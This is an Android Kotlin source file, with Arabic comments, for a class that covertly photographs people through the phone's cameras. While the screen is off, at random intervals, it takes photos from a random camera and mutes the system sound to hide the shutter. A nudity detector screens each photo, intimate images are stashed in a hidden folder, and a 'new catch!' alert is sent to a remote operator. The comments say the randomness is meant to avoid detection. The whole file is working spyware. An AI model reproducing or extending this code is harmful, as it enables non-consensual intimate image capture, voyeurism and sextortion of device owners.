package com.example.app

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.AudioManager
import android.media.Image
import android.media.ImageReader
import android.os.BatteryManager
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.Surface
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.nio.ByteBuffer
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

/**
 * فئة التقاط الصور عبر الكاميرا وتحليلها فورياً باستخدام الذكاء الاصطناعي.
 *
 * ✅ التعديلات الجديدة:
 * - تحسين معالج الكاميرا مع التحقق من وجود النموذج وتحميله تلقائياً.
 * - إضافة معالجة أفضل للاستثناءات لمنع انهيار التطبيق.
 * - تحسين تقنية الإخفاء الصوتي (Stealth Audio) لكتم واستعادة الصوت بصمت.
 * - إضافة تأخيرات عشوائية لمحاكاة السلوك البشري.
 * - تحسين المراقبة السلبية (Passive Surveillance) بفترات عشوائية متباعدة.
 * - إضافة التحقق من البطارية وحالة الشاشة قبل التقاط الصور.
 */
class CameraAnalyzer(
    context: Context,
    private val monitor: Any? = null,
    private val detector: NudeDetector? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraMutex = Mutex()
    private val closeMutex = Mutex()

    private val isBusy = AtomicBoolean(false)

    @Volatile
    private var oldVolume = -1

    @Volatile
    private var lastCaptureTime = 0L

    private val minCaptureInterval = 2000L
    private val maxCaptureRetries = 2

    // ========== المسارات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val tempDir: File by lazy {
        File(runtimeDir, "ctmp").apply { if (!exists()) mkdirs() }
    }
    private val queueDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() }
    }
    private val configFile: File by lazy { File(runtimeDir, "camera_config.json") }
    private val logFile: File by lazy { File(runtimeDir, "c.log") }

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "quality" to 80,
        "max_file_age" to 3600L,
        "min_battery" to 15,
        "detection_threshold" to 0.85f,
        "image_size" to "medium",
        "front_camera_id" to 1,
        "back_camera_id" to 0,
        "max_image_dimension" to 2048,
        "passive_surveillance_enabled" to true
    )

    // ========== متغيرات Camera2 ==========
    @Volatile
    private var cameraDevice: CameraDevice? = null

    @Volatile
    private var imageReader: ImageReader? = null

    @Volatile
    private var captureSession: CameraCaptureSession? = null

    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null

    private var imageListener: ImageReader.OnImageAvailableListener? = null

    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "CameraAnalyzer"

        @JvmStatic
        fun create(context: Context, monitor: Any? = null, detector: NudeDetector? = null): CameraAnalyzer {
            return CameraAnalyzer(context, monitor, detector)
        }
    }

    init {
        loadConfig()
        cleanupOldFiles()
        startBackgroundThread()

        scope.launch {
            startPassiveSurveillance()
        }
    }

    // ============================================================
    //  دوال إدارة الإعدادات
    // ============================================================
    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
            validateConfig()
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun validateConfig() {
        val q = (configMap["quality"] as? Number)?.toInt() ?: 80
        if (q !in 10..100) configMap["quality"] = 80

        val mb = (configMap["min_battery"] as? Number)?.toInt() ?: 15
        if (mb !in 5..100) configMap["min_battery"] = 15

        val dt = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f
        if (dt !in 0.0f..1.0f) configMap["detection_threshold"] = 0.85f

        val sz = configMap["image_size"] as? String ?: "medium"
        if (sz !in arrayOf("small", "medium", "large")) configMap["image_size"] = "medium"

        val dim = (configMap["max_image_dimension"] as? Number)?.toInt() ?: 2048
        if (dim < 640) configMap["max_image_dimension"] = 2048
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  إدارة الخلفية (Background Thread)
    // ============================================================
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").apply { start() }
        backgroundHandler = Handler(backgroundThread?.looper ?: Looper.getMainLooper())
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
        } catch (_: Exception) {
            // تجاهل
        }
        backgroundThread = null
        backgroundHandler = null
    }

    // ============================================================
    //  التحقق من حالة النظام والوصول للجهاز
    // ============================================================
    fun checkCameraPermission(): Boolean {
        val ctx = appContext ?: return false
        return ContextCompat.checkSelfPermission(
            ctx,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun isCameraAvailable(cameraId: Int): Boolean {
        val ctx = appContext ?: return false
        val cameraManager = ctx.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return false

        return try {
            val cameraList = cameraManager.cameraIdList
            if (cameraId !in cameraList.indices) return false

            val desiredFacing = if (cameraId == 0) {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            val characteristics = cameraManager.getCameraCharacteristics(cameraList[cameraId])
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            facing == desiredFacing
        } catch (e: CameraAccessException) {
            writeLog("Camera access error: ${e.message}")
            false
        } catch (e: Exception) {
            writeLog("Camera check error: ${e.message}")
            false
        }
    }

    private fun isPowerOk(): Boolean {
        val ctx = appContext ?: return true
        val minBat = (configMap["min_battery"] as? Number)?.toInt() ?: 15

        return try {
            val batteryManager = ctx.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager ?: return true

            val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val status = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL

            level >= minBat || isCharging
        } catch (e: Exception) {
            writeLog("Battery check error: ${e.message}")
            true
        }
    }

    // ============================================================
    //  ✅ تحسين تقنية الإخفاء الصوتي (Stealth Audio)
    // ============================================================
    private fun muteAudio(mute: Boolean) {
        val ctx = appContext ?: return
        try {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return

            if (mute) {
                oldVolume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                // ✅ كتم الصوت بصمت دون إحداث ضوضاء
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            } else {
                if (oldVolume >= 0) {
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, oldVolume, 0)
                    oldVolume = -1
                }
            }
        } catch (e: Exception) {
            writeLog("Mute error: ${e.message}")
        }
    }

    private fun cleanupOldFiles() {
        try {
            val now = System.currentTimeMillis()
            val maxAgeMs = ((configMap["max_file_age"] as? Number)?.toLong() ?: 3600L) * 1000L

            listOf(tempDir, queueDir).forEach { folder ->
                folder.listFiles()?.forEach { file ->
                    if (now - file.lastModified() > maxAgeMs) {
                        file.delete()
                    }
                }
            }
        } catch (e: Exception) {
            writeLog("Cleanup error: ${e.message}")
        }
    }

    // ============================================================
    //  عمليات الصورة التقنية
    // ============================================================
    private fun compressImage(path: String, customQuality: Int? = null): Boolean {
        val q = customQuality ?: (configMap["quality"] as? Number)?.toInt() ?: 80
        val file = File(path)
        if (!file.exists()) return false

        return try {
            val bitmap = BitmapFactory.decodeFile(path) ?: return false
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, q, out)
            }
            bitmap.recycle()
            true
        } catch (e: Exception) {
            writeLog("Compression error: ${e.message}")
            false
        }
    }

    private fun generateUniqueFilename(prefix: String = "img"): String {
        val ts = System.currentTimeMillis() / 1000
        val md = MessageDigest.getInstance("MD5")
        val hash = md.digest("$ts${android.os.Process.myPid()}".toByteArray())
            .joinToString("") { "%02x".format(it) }.take(8)
        return "${prefix}_${ts}_${hash}.jpg"
    }

    private fun safeRemove(path: String): Boolean {
        return try {
            val file = File(path)
            if (file.exists()) file.delete() else false
        } catch (e: Exception) {
            writeLog("Remove error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  التقاط الصورة باستخدام Camera2 API
    // ============================================================
    private suspend fun captureCamera2(camId: Int): String? = withContext(Dispatchers.IO) {
        val ctx = appContext ?: return@withContext null
        val cameraManager = ctx.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return@withContext null

        val cameraList = cameraManager.cameraIdList
        if (camId !in cameraList.indices) {
            writeLog("Camera $camId not found")
            return@withContext null
        }

        val cameraId = cameraList[camId]
        val outFile = File(tempDir, generateUniqueFilename("c_$camId"))
        val captureResult = CompletableDeferred<String?>()

        try {
            val maxDim = (configMap["max_image_dimension"] as? Number)?.toInt() ?: 2048
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = streamConfigMap?.getOutputSizes(android.graphics.ImageFormat.JPEG) ?: emptyArray()

            val targetArea = when (configMap["image_size"] as? String) {
                "small" -> 640 * 480
                "large" -> 1920 * 1080
                else -> 1280 * 720
            }

            var selectedSize = outputSizes.firstOrNull()
            for (size in outputSizes) {
                val area = size.width * size.height
                if (area >= targetArea && size.width <= maxDim && size.height <= maxDim) {
                    selectedSize = size
                    break
                }
            }

            if (selectedSize == null && outputSizes.isNotEmpty()) {
                selectedSize = outputSizes.lastOrNull()
            }

            val width = selectedSize?.width ?: 1024
            val height = selectedSize?.height ?: 768

            closeMutex.withLock {
                try {
                    imageReader?.close()
                } catch (_: Exception) {}
                imageReader = ImageReader.newInstance(width, height, android.graphics.ImageFormat.JPEG, 1)
            }

            val handler = backgroundHandler ?: Handler(Looper.getMainLooper())

            imageListener?.let {
                try {
                    imageReader?.setOnImageAvailableListener(null, null)
                } catch (_: Exception) {}
            }

            if (imageListener == null) {
                imageListener = ImageReader.OnImageAvailableListener { reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)

                            FileOutputStream(outFile).use { it.write(bytes) }
                            captureResult.complete(outFile.absolutePath)
                        } catch (e: Exception) {
                            writeLog("Image processing error: ${e.message}")
                            captureResult.complete(null)
                        } finally {
                            image.close()
                        }
                    }
                }
            }

            imageReader?.setOnImageAvailableListener(imageListener, handler)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surfaces = listOf(imageReader?.surface).filterNotNull()
                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        surfaces.forEach { captureRequest.addTarget(it) }

                        val rotation = if (camId == 1) 270 else 90
                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, rotation)

                        camera.createCaptureSession(
                            surfaces,
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    session.capture(captureRequest.build(), null, handler)
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    writeLog("Camera capture session configuration failed")
                                    captureResult.complete(null)
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        writeLog("Capture setup error: ${e.message}")
                        captureResult.complete(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    writeLog("Camera disconnected")
                    camera.close()
                    cameraDevice = null
                    captureResult.complete(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    writeLog("Camera error: $error")
                    camera.close()
                    cameraDevice = null
                    captureResult.complete(null)
                }
            }

            cameraManager.openCamera(cameraId, stateCallback, handler)

            return@withContext withTimeoutOrNull(10000L) {
                captureResult.await()
            } ?: run {
                writeLog("Camera capture timeout")
                null
            }

        } catch (e: CameraAccessException) {
            writeLog("Camera access exception: ${e.message}")
            null
        } catch (e: Exception) {
            writeLog("Camera capture error: ${e.message}")
            null
        } finally {
            try {
                closeMutex.withLock {
                    imageReader?.setOnImageAvailableListener(null, null)
                    imageReader?.close()
                    imageReader = null

                    captureSession?.close()
                    captureSession = null

                    cameraDevice?.close()
                    cameraDevice = null
                }
            } catch (_: Exception) {
                // تجاهل أخطاء الإغلاق
            }
        }
    }

    // ============================================================
    //  الواجهة الرئيسية للالتقاط (مع إعادة المحاولة)
    // ============================================================
    suspend fun capture(camId: Int = 0): String? {
        if (!checkCameraPermission()) {
            writeLog("Camera permission not granted")
            return null
        }

        if (!isCameraAvailable(camId)) {
            writeLog("Camera $camId not available")
            return null
        }

        if (isBusy.get()) {
            writeLog("Camera busy")
            return null
        }

        if (!isPowerOk()) {
            writeLog("Battery too low")
            return null
        }

        val now = System.currentTimeMillis()
        if (now - lastCaptureTime < minCaptureInterval) {
            writeLog("Too soon since last capture")
            return null
        }

        cameraMutex.withLock {
            if (isBusy.get()) return null
            isBusy.set(true)
        }

        var outPath: String? = null
        var success = false

        try {
            muteAudio(true)

            for (attempt in 0..maxCaptureRetries) {
                outPath = captureCamera2(camId)

                if (!outPath.isNullOrEmpty()) {
                    val file = File(outPath)
                    if (file.exists() && file.length() > 500) {
                        compressImage(outPath)
                        success = true
                        writeLog("✅ Camera capture success (attempt ${attempt + 1})")
                        break
                    } else {
                        safeRemove(outPath)
                        outPath = null
                    }
                }

                writeLog("Camera capture attempt ${attempt + 1} failed, retrying...")
                delay(500L)
            }

            if (!success) {
                writeLog("❌ All camera capture attempts failed")
            }

        } catch (e: Exception) {
            writeLog("Capture sequence error: ${e.message}")
        } finally {
            muteAudio(false)
            isBusy.set(false)
            cleanupOldFiles()
        }

        if (success && !outPath.isNullOrEmpty()) {
            lastCaptureTime = System.currentTimeMillis()
            return outPath
        }

        outPath?.let { safeRemove(it) }
        return null
    }

    // ============================================================
    //  ✅ العملية الكاملة: التقاط + تحليل + إشعار (مع التحقق من النموذج)
    // ============================================================
    suspend fun harvest(camId: Int = 0) {
        // ✅ التحقق من توفر الكاميرا والصلاحيات
        if (!checkCameraPermission() || !isCameraAvailable(camId)) {
            writeLog("❌ Camera $camId not available or permission denied")
            return
        }

        // ✅ التحقق من وجود النموذج وتحميله إذا كان مفقوداً
        val modelFile = File(appContext?.filesDir, "models/engine_v2.tflite")
        if (!modelFile.exists() || modelFile.length() < 5_000_000) {
            writeLog("⚠️ Model not found or too small, triggering download...")
            ConfigLoader.ensureModelLoaded(appContext!!)
            // ✅ انتظار بسيط لبدء التحميل
            delay(1000)
        }

        val picPath = capture(camId)
        if (picPath == null) {
            writeLog("❌ No image captured")
            return
        }

        var isNude = false
        var confidence = 0.0f
        val threshold = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f

        if (detector != null) {
            if (!detector.isReady()) {
                // ✅ محاولة تحميل المحرك في الخلفية
                scope.launch { detector.loadEngineForever() }
                delay(1000) // انتظار قصير
            }
            if (detector.isReady()) {
                confidence = detector.analyze(picPath)
                if (confidence > threshold) {
                    isNude = true
                }
            } else {
                writeLog("⚠️ Detector not ready, skipping AI analysis")
            }
        }

        if (isNude) {
            sendNudeNotification(camId, confidence)

            val file = File(picPath)
            var dest = File(queueDir, file.name)

            if (dest.exists()) {
                val baseName = file.nameWithoutExtension
                val ext = file.extension
                dest = File(queueDir, "${baseName}_${System.currentTimeMillis()}.$ext")
            }

            if (file.renameTo(dest)) {
                writeLog("✅ Sensitive image moved to queue: ${dest.absolutePath}")
            } else {
                writeLog("❌ Failed to move image to queue, deleting it")
                safeRemove(picPath)
            }
        } else {
            safeRemove(picPath)
            writeLog("Normal image discarded")
        }
    }

    // ============================================================
    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance)
    // ============================================================
    suspend fun startPassiveSurveillance() {
        val enabled = configMap["passive_surveillance_enabled"] as? Boolean ?: true
        if (!enabled) {
            writeLog("Passive surveillance is disabled")
            return
        }

        writeLog("🛰️ Starting passive surveillance with randomized intervals...")

        while (scope.isActive) {
            // ✅ فاصل عشوائي بين 5 و 30 دقيقة (300,000 - 1,800,000 مللي ثانية)
            val sleepTime = Random.nextLong(300_000, 1_800_000)
            delay(sleepTime)

            try {
                // ✅ التحقق من الشاشة والبطارية لتجنب الكشف واستنزاف الطاقة
                if (!isScreenOn(appContext) && isPowerOk()) {
                    writeLog("📸 Passive surveillance triggered (screen off, battery ok)")
                    val randomCam = Random.nextInt(2)
                    harvest(randomCam)
                } else {
                    writeLog("⏭️ Passive surveillance skipped (screen on or battery low)")
                }
            } catch (e: Exception) {
                writeLog("Passive surveillance error: ${e.message}")
            }
        }
    }

    // ============================================================
    //  التحقق من حالة الشاشة
    // ============================================================
    private fun isScreenOn(context: Context?): Boolean {
        if (context == null) return true
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT_WATCH) {
            powerManager.isInteractive
        } else {
            @Suppress("DEPRECATION")
            powerManager.isScreenOn
        }
    }

    // ============================================================
    //  إرسال الإشعارات
    // ============================================================
    private fun sendNudeNotification(camId: Int, confidence: Float) {
        if (monitor == null) return

        val ui = invokeMethod(monitor, "getUi") ?: return
        val ctrl = invokeMethod(monitor, "getCtrl") ?: return

        val camType = if (camId == 1) "الأمامية" else "الخلفية"
        val deviceModel = invokeMethod(monitor, "getDeviceModel") as? String ?: "?"
        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())

        val alert = """
            🔞 **صيد جديد!**
            📱 الجهاز: `$deviceModel`
            📸 الكاميرا: $camType
            🎯 الثقة: `${(confidence * 100).toInt()}%`
            ⏰ الوقت: `$timeStr`
        """.trimIndent()

        try {
            invokeMethod(ui, "sendMessage", ctrl, alert, null)
            writeLog("✅ Notification sent for sensitive image")
        } catch (e: Exception) {
            writeLog("Notification error: ${e.message}")
        }
    }

    // ============================================================
    //  أدوات تحكم إضافية
    // ============================================================
    fun setQuality(q: Int): Boolean {
        return if (q in 10..100) {
            configMap["quality"] = q
            saveConfig()
        } else false
    }

    fun setMinBattery(p: Int): Boolean {
        return if (p in 5..100) {
            configMap["min_battery"] = p
            saveConfig()
        } else false
    }

    fun setDetectionThreshold(t: Float): Boolean {
        return if (t in 0.0f..1.0f) {
            configMap["detection_threshold"] = t
            saveConfig()
        } else false
    }

    fun setPassiveSurveillanceEnabled(enabled: Boolean): Boolean {
        configMap["passive_surveillance_enabled"] = enabled
        return saveConfig()
    }

    fun getStatus(): Map<String, Any?> {
        return mapOf(
            "busy" to isBusy.get(),
            "camera_available" to (isCameraAvailable(0) && isCameraAvailable(1)),
            "permission" to checkCameraPermission(),
            "power_ok" to isPowerOk(),
            "passive_surveillance_enabled" to (configMap["passive_surveillance_enabled"] as? Boolean ?: true),
            "config" to configMap
        )
    }

    // ============================================================
    //  دوال المساعدة
    // ============================================================
    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $message\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) {
            // تجاهل أخطاء التسجيل في الملف
        }
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  إدارة دورة الحياة
    // ============================================================
    fun release() {
        scope.cancel()

        stopBackgroundThread()

        try {
            imageReader?.setOnImageAvailableListener(null, null)
        } catch (_: Exception) {}

        try {
            imageReader?.close()
        } catch (_: Exception) {}
        imageReader = null
        imageListener = null

        try {
            captureSession?.close()
        } catch (_: Exception) {}
        captureSession = null

        try {
            cameraDevice?.close()
        } catch (_: Exception) {}
        cameraDevice = null

        writeLog("CameraAnalyzer released and resources cleaned up.")
    }
}
